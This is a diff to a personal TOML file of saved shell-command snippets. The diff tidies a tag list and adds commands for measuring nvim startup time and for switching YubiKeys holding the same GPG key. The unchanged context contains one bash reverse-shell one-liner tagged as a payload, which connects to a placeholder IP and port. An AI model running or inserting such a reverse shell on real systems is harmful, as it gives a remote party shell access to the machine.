@@ -115,7 +115,7 @@
 [[snippets]]
   description = "netcat reverse shell remote"
   command = "bash -i >&/dev/tcp/<ip:>/<port=8888> 0>&1"
-  tag = ["reverse-shell","payload"]
+  tag = ["reverse-shell", "payload"]
   output = ""
 
 [[snippets]]
@@ -200,4 +200,9 @@
   description = "show nvim startup time"
   command = "vim-startuptime -vimpath nvim"
   tag = ["misc"]
+  output = ""
+
+[[snippets]]
+  description = "switch yubikeys for same GPG key"
+  command = "gpg-connect-agent \"scd serialno\" \"learn --force\" /bye"
   output = ""
